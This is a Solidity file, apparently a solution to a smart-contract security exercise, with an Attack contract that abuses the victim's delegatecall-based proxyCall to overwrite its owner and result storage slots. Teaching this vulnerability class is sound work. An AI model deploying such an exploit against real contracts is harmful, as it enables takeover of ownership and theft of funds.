// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";

interface ID31eg4t3 {
    function proxyCall(bytes calldata data) external returns (address);
    function changeResult() external;
}

contract Attack {
    address internal immutable victim;
    uint256 private a2;
    uint256 private a3;
    address private a4;
    address private a5;
    address public owner;
    mapping(address => bool) public result;

    constructor(address addr) payable {
        victim = addr;
    }

    // NOTE: You might need some malicious function here

    function maliciousStuff(address hacker) external {
        owner = hacker;
        result[hacker] = true;
    }

    function exploit() external {
        // TODO: Add your implementation here
        // Note: Make sure you know how delegatecall works
        bytes memory data = abi.encodeWithSignature("maliciousStuff(address)", msg.sender);
        ID31eg4t3(victim).proxyCall(data);
    }
}
